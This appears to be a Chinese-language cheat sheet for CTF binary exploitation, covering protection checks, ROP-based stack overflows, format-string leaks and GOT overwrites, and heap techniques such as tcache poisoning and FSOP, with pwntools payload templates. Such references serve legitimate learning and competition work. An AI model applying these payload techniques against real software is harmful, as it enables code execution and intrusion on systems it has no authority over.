# 二进制漏洞利用速查

## 前置

```bash
pip install pwntools ropper ROPgadget
gem install one_gadget
```

## 解题流程

```bash
# 1. 保护检查
checksec --file=binary
file binary
readelf -h binary
```

### 保护影响决策表

| 保护 | 状态 | 攻击影响 |
|------|------|---------|
| PIE | 禁用 | 地址固定 → 直接覆写 |
| RELRO | Partial | GOT可写 → GOT覆写 |
| RELRO | Full | GOT只读 → hook/返回地址 |
| NX | 启用 | 需ROP或ret2win |
| Canary | 存在 | 需泄露canary或转堆攻击 |

## 栈溢出

```python
from pwn import *
# 偏移量确定
offset = cyclic_find(<crash_addr>)  # +8 (saved rbp)

# 基础 ret2win
pop_rdi_ret = 0x40150b  # ROPgadget --binary binary | grep "pop rdi"
ret = 0x40101a          # 栈对齐 (movaps 修复)
payload = b"A" * offset + p64(ret) + p64(pop_rdi_ret) + p64(arg) + p64(win)
```

## 格式化字符串

```python
# 泄露栈
payload = b"%p." * 20

# 任意写 (%n)
payload = b"%<val>c%<pos>$hn" + p64(target_addr)

# GOT覆写 (Partial RELRO)
payload = fmtstr_payload(write_pos, {got_entry: target_func})
```

## 堆利用

| 场景 | 攻击 |
|------|------|
| UAF + Fastbin | Fastbin overlap → 函数指针 |
| tcache | tcache poisoning → 任意分配 |
| glibc < 2.34 | `__free_hook` → system |
| glibc ≥ 2.34 | IO_FILE / FSOP |

## 常见陷阱

- movaps 崩溃 → 加 `ret` gadget 对齐
- 浮点参数放在 XMM 寄存器（不是 RDI）
- `sendline` vs `send` 的区别（换行符是否影响输入）
